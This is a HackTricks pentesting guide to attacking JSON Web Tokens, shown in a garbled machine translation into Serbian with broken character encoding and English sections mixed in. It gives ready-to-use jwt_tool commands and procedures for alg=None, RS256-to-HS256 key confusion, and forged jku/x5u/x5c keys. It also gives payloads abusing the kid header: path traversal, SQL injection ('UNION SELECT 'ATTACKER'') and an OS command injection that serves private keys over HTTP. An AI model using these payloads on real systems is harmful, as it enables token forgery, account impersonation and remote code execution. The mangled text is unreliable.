# JWT Ranljivosti (Json Web Tokens)

{% hint style="success" %}
UÄite i veÅ¾bajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
UÄite i veÅ¾bajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>PodrÅ¾ite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ako ste zainteresovani za **hakersku karijeru** i da hakujete ono Å¡to se ne moÅ¾e hakovati - **zapoÅ¡ljavamo!** (_potrebno je teÄno pisanje i govorenje poljskog_).

{% embed url="https://www.stmcyber.com/careers" %}

**Deo ovog posta se zasniva na sjajnom postu:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Autor sjajnog alata za pentesting JWT-ova** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Brze Pobjede**

Pokrenite [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) u reÅ¾imu `All Tests!` i saÄekajte zelene linije.
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Ako imate sreÄ‡e, alat Ä‡e pronaÄ‡i neki sluÄaj gde web aplikacija pogreÅ¡no proverava JWT:

![](<../.gitbook/assets/image (935).png>)

Tada moÅ¾ete pretraÅ¾iti zahtev u vaÅ¡em proxy-ju ili izvuÄ‡i koriÅ¡Ä‡eni JWT za taj zahtev koristeÄ‡i jwt\_ alat:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
MoÅ¾ete takoÄ‘e koristiti [**Burp Extension SignSaboteur**](https://github.com/d0ge/sign-saboteur) za pokretanje JWT napada iz Burp-a.

### Manipulacija podacima bez modifikacije

MoÅ¾ete samo manipulisati podacima ostavljajuÄ‡i potpis nepromenjenim i proveriti da li server proverava potpis. PokuÅ¡ajte da promenite svoje korisniÄko ime na "admin", na primer.

#### **Da li se token proverava?**

Da biste proverili da li se potpis JWT-a verifikuje:

* Poruka o greÅ¡ci sugeriÅ¡e da je verifikacija u toku; osetljive detalje u opÅ¡irnim greÅ¡kama treba pregledati.
* Promena u vraÄ‡enoj stranici takoÄ‘e ukazuje na verifikaciju.
* Nema promene sugeriÅ¡e da nema verifikacije; tada treba eksperimentisati sa manipulacijom tvrdnjama u payload-u.

### Izvor

VaÅ¾no je utvrditi da li je token generisan na strani servera ili klijenta pregledom istorije zahteva proksija.

* Tokeni prvi put viÄ‘eni sa strane klijenta sugeriÅ¡u da bi kljuÄ mogao biti izloÅ¾en klijentskom kodu, Å¡to zahteva dalju istragu.
* Tokeni koji potiÄu sa strane servera ukazuju na siguran proces.

### Trajanje

Proverite da li token traje viÅ¡e od 24h... moÅ¾da nikada ne istiÄe. Ako postoji polje "exp", proverite da li server ispravno obraÄ‘uje to.

### Brute-force HMAC tajna

[**Pogledajte ovu stranicu.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Izmenite algoritam na None

Postavite koriÅ¡Ä‡eni algoritam na "None" i uklonite deo sa potpisom.

Koristite Burp ekstenziju pod nazivom "JSON Web Token" da biste isprobali ovu ranjivost i promenili razliÄite vrednosti unutar JWT-a (poÅ¡aljite zahtev u Repeater i u "JSON Web Token" tabu moÅ¾ete modifikovati vrednosti tokena. TakoÄ‘e moÅ¾ete odabrati da postavite vrednost polja "Alg" na "None").

### Promenite algoritam RS256 (asimetriÄni) na HS256 (simetriÄni) (CVE-2016-5431/CVE-2016-10555)

Algoritam HS256 koristi tajni kljuÄ za potpisivanje i verifikaciju svake poruke.\
Algoritam RS256 koristi privatni kljuÄ za potpisivanje poruke i koristi javni kljuÄ za autentifikaciju.

Ako promenite algoritam sa RS256 na HS256, kod na backend-u koristi javni kljuÄ kao tajni kljuÄ i zatim koristi HS256 algoritam za verifikaciju potpisa.

Zatim, koristeÄ‡i javni kljuÄ i menjajuÄ‡i RS256 u HS256, mogli bismo kreirati validan potpis. MoÅ¾ete preuzeti sertifikat web servera izvrÅ¡avajuÄ‡i ovo:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Nova javna kljuÄ unutar zaglavlja

NapadaÄ ugraÄ‘uje novi kljuÄ u zaglavlje tokena, a server koristi ovaj novi kljuÄ za verifikaciju potpisa (CVE-2018-0114).

Ovo se moÅ¾e uraditi sa "JSON Web Tokens" Burp ekstenzijom.\
(PoÅ¡aljite zahtev u Repeater, unutar taba JSON Web Token izaberite "CVE-2018-0114" i poÅ¡aljite zahtev).

### JWKS Spoofing

Uputstva detaljno opisuju metodu za procenu bezbednosti JWT tokena, posebno onih koji koriste "jku" zaglavlje. Ovo zaglavlje bi trebalo da se povezuje sa JWKS (JSON Web Key Set) datotekom koja sadrÅ¾i javni kljuÄ neophodan za verifikaciju tokena.

* **Procena Tokena sa "jku" Zaglavljem**:
* Proverite URL "jku" tvrdnje da biste osigurali da vodi do odgovarajuÄ‡e JWKS datoteke.
* Izmenite "jku" vrednost tokena da biste usmerili ka kontrolisanoj veb usluzi, omoguÄ‡avajuÄ‡i posmatranje saobraÄ‡aja.
* **PraÄ‡enje HTTP Interakcije**:
* Posmatranje HTTP zahteva ka vaÅ¡em specificiranom URL-u ukazuje na pokuÅ¡aje servera da preuzme kljuÄeve sa vaÅ¡eg pruÅ¾enog linka.
* Kada koristite `jwt_tool` za ovaj proces, kljuÄno je aÅ¾urirati `jwtconf.ini` datoteku sa vaÅ¡om liÄnom JWKS lokacijom kako bi se olakÅ¡alo testiranje.
* **Komanda za `jwt_tool`**:
*   IzvrÅ¡ite sledeÄ‡u komandu da simulirate scenario sa `jwt_tool`:

```bash
python3 jwt_tool.py JWT_HERE -X s
```

### Pregled Problema sa Kid

Opcionalna zaglavna tvrdnja poznata kao `kid` koristi se za identifikaciju specifiÄnog kljuÄa, Å¡to postaje posebno vaÅ¾no u okruÅ¾enjima gde postoji viÅ¡e kljuÄeva za verifikaciju potpisa tokena. Ova tvrdnja pomaÅ¾e u odabiru odgovarajuÄ‡eg kljuÄa za verifikaciju potpisa tokena.

#### OtkriÄ‡e KljuÄa kroz "kid"

Kada je `kid` tvrdnja prisutna u zaglavlju, preporuÄuje se pretraÅ¾ivanje veb direktorijuma za odgovarajuÄ‡u datoteku ili njene varijacije. Na primer, ako je `"kid":"key/12345"` specificirano, datoteke _/key/12345_ i _/key/12345.pem_ treba pretraÅ¾iti u veb korenu.

#### Putanja Prelaz sa "kid"

`kid` tvrdnja se takoÄ‘e moÅ¾e iskoristiti za navigaciju kroz fajl sistem, potencijalno omoguÄ‡avajuÄ‡i izbor proizvoljne datoteke. MoguÄ‡e je testirati povezanost ili izvrÅ¡iti Server-Side Request Forgery (SSRF) napade menjajuÄ‡i `kid` vrednost kako bi se ciljali specifiÄni fajlovi ili usluge. Manipulacija JWT-om da se promeni `kid` vrednost dok se zadrÅ¾ava originalni potpis moÅ¾e se postiÄ‡i koriÅ¡Ä‡enjem `-T` oznake u jwt\_tool, kao Å¡to je prikazano u nastavku:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
By targeting files with predictable content, it's possible to forge a valid JWT. For instance, the `/proc/sys/kernel/randomize_va_space` file in Linux systems, known to contain the value **2**, can be used in the `kid` parameter with **2** as the symmetric password for JWT generation.

#### SQL Injection via "kid"

If the `kid` claim's content is employed to fetch a password from a database, an SQL injection could be facilitated by modifying the `kid` payload. An example payload that uses SQL injection to alter the JWT signing process includes:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

This alteration forces the use of a known secret key, `ATTACKER`, for JWT signing.

#### OS Injection through "kid"

A scenario where the `kid` parameter specifies a file path used within a command execution context could lead to Remote Code Execution (RCE) vulnerabilities. By injecting commands into the `kid` parameter, it's possible to expose private keys. An example payload for achieving RCE and key exposure is:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u and jku

#### jku

jku stands for **JWK Set URL**.\
If the token uses a â€œ**jku**â€ **Header** claim then **check out the provided URL**. This should point to a URL containing the JWKS file that holds the Public Key for verifying the token. Tamper the token to point the jku value to a web service you can monitor traffic for.

First you need to create a new certificate with new private & public keys.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Zatim moÅ¾ete koristiti na primer [**jwt.io**](https://jwt.io) da kreirate novi JWT sa **kreiranim javnim i privatnim kljuÄevima i usmerite parametar jku na kreirani sertifikat.** Da biste kreirali validan jku sertifikat, moÅ¾ete preuzeti originalni i promeniti potrebne parametre.

MoÅ¾ete dobiti parametre "e" i "n" iz javnog sertifikata koristeÄ‡i:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. URI koji pokazuje na skup X.509 (standardni format sertifikata) javnih sertifikata kodiranih u PEM formatu. Prvi sertifikat u skupu mora biti onaj koji se koristi za potpisivanje ovog JWT-a. SledeÄ‡i sertifikati svaki potpisuju prethodni, Äime se zavrÅ¡ava lanac sertifikata. X.509 je definisan u RFC 52807. Transportna sigurnost je potrebna za prenos sertifikata.

PokuÅ¡ajte da **promenite ovaj header u URL pod vaÅ¡om kontrolom** i proverite da li je primljena neka zahtev. U tom sluÄaju, **mogli biste da manipuliÅ¡ete JWT-om**.

Da biste falsifikovali novi token koristeÄ‡i sertifikat koji kontroliÅ¡ete, potrebno je da kreirate sertifikat i izdvojite javne i privatne kljuÄeve:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Zatim moÅ¾ete koristiti na primer [**jwt.io**](https://jwt.io) da kreirate novi JWT sa **kreiranim javnim i privatnim kljuÄevima i usmerite parametar x5u na sertifikat .crt koji je kreiran.**

![](<../.gitbook/assets/image (956).png>)

TakoÄ‘e moÅ¾ete zloupotrebiti obe ove ranjivosti **za SSRF.**

#### x5c

Ovaj parametar moÅ¾e sadrÅ¾ati **sertifikat u base64**:

![](<../.gitbook/assets/image (1119).png>)

Ako napadaÄ **generiÅ¡e sertifikat sa sopstvenim potpisom** i kreira laÅ¾ni token koristeÄ‡i odgovarajuÄ‡i privatni kljuÄ i zameni vrednost parametra "x5c" sa novokreiranim sertifikatom i modifikuje druge parametre, naime n, e i x5t, tada bi suÅ¡tinski laÅ¾ni token bio prihvaÄ‡en od strane servera.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### UgraÄ‘eni javni kljuÄ (CVE-2018-0114)

Ako JWT sadrÅ¾i ugraÄ‘eni javni kljuÄ kao u sledeÄ‡em scenariju:

![](<../.gitbook/assets/image (624).png>)

KoristeÄ‡i sledeÄ‡i nodejs skript, moguÄ‡e je generisati javni kljuÄ iz tih podataka:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="â€‹ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"â€‹;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
MoguÄ‡e je generisati novi privatni/javni kljuÄ, ugraditi novi javni kljuÄ unutar tokena i koristiti ga za generisanje novog potpisa:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
MoÅ¾ete dobiti "n" i "e" koristeÄ‡i ovaj nodejs skript:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Finally, using the public and private key and the new "n" and "e" values you can use [jwt.io](https://jwt.io) to forge a new valid JWT with any information.

### ES256: Otkivanje privatnog kljuÄa sa istim nonce

Ako neke aplikacije koriste ES256 i koriste isti nonce za generisanje dva jwta, privatni kljuÄ moÅ¾e biti obnovljen.

Here is a example: [ECDSA: Otkivanje privatnog kljuÄa, ako se koristi isti nonce (sa SECP256k1)](https://asecuritysite.com/encryption/ecd5)

### JTI (JWT ID)

JTI (JWT ID) tvrdnja pruÅ¾a jedinstveni identifikator za JWT token. MoÅ¾e se koristiti za spreÄavanje ponovnog koriÅ¡Ä‡enja tokena.\
MeÄ‘utim, zamislite situaciju u kojoj je maksimalna duÅ¾ina ID-a 4 (0001-9999). Zahtev 0001 i 10001 Ä‡e koristiti isti ID. Dakle, ako backend poveÄ‡ava ID sa svakim zahtevom, mogli biste to iskoristiti da **ponovno poÅ¡aljete zahtev** (trebalo bi poslati 10000 zahteva izmeÄ‘u svake uspeÅ¡ne ponovne upotrebe).

### JWT Registrovane tvrdnje

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Drugi napadi

**Napadi preusmeravanja izmeÄ‘u usluga**

PrimeÄ‡eno je da se neke web aplikacije oslanjaju na pouzdanu JWT uslugu za generisanje i upravljanje svojim tokenima. ZabeleÅ¾eni su sluÄajevi kada je token, generisan za jednog klijenta od strane JWT usluge, prihvaÄ‡en od strane drugog klijenta iste JWT usluge. Ako se primeti izdavanje ili obnova JWT-a putem usluge treÄ‡e strane, treba istraÅ¾iti moguÄ‡nost registracije na raÄun drugog klijenta te usluge koristeÄ‡i isto korisniÄko ime/email. Zatim bi trebalo pokuÅ¡ati ponovo poslati dobijeni token u zahtevu ka cilju da se vidi da li Ä‡e biti prihvaÄ‡en.

* KritiÄni problem moÅ¾e biti naznaÄen prihvatanjem vaÅ¡eg tokena, potencijalno omoguÄ‡avajuÄ‡i laÅ¾no predstavljanje bilo kog korisniÄkog raÄuna. MeÄ‘utim, treba napomenuti da bi mogla biti potrebna dozvola za Å¡ire testiranje ako se registrujete na aplikaciji treÄ‡e strane, jer bi to moglo uÄ‡i u pravnu sivu zonu.

**Provera isteka tokena**

Istek tokena se proverava koriÅ¡Ä‡enjem "exp" Payload tvrdnje. S obzirom na to da se JWT-ovi Äesto koriste bez informacija o sesiji, potrebna je paÅ¾ljiva obrada. U mnogim sluÄajevima, hvatanje i ponovna upotreba JWT-a drugog korisnika moglo bi omoguÄ‡iti laÅ¾no predstavljanje tog korisnika. JWT RFC preporuÄuje ublaÅ¾avanje napada ponovnog koriÅ¡Ä‡enja JWT-a koriÅ¡Ä‡enjem "exp" tvrdnje za postavljanje vremena isteka za token. Pored toga, implementacija relevantnih provera od strane aplikacije kako bi se osiguralo procesuiranje ove vrednosti i odbijanje isteÄenih tokena je kljuÄna. Ako token ukljuÄuje "exp" tvrdnju i vremenska ograniÄenja testiranja to dozvoljava, savetuje se Äuvanje tokena i ponovna upotreba nakon Å¡to je vreme isteka proÅ¡lo. SadrÅ¾aj tokena, ukljuÄujuÄ‡i analizu vremenskih oznaka i proveru isteka (vremenska oznaka u UTC), moÅ¾e se proÄitati koriÅ¡Ä‡enjem -R opcije jwt\_tool-a.

* Bezbednosni rizik moÅ¾e postojati ako aplikacija i dalje validira token, jer to moÅ¾e implicirati da token nikada ne moÅ¾e isteÄ‡i.

### Alati

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

If you are interested in **hacking career** and hack the unhackable - **we are hiring!** (_fluent polish written and spoken required_).

{% embed url="https://www.stmcyber.com/careers" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
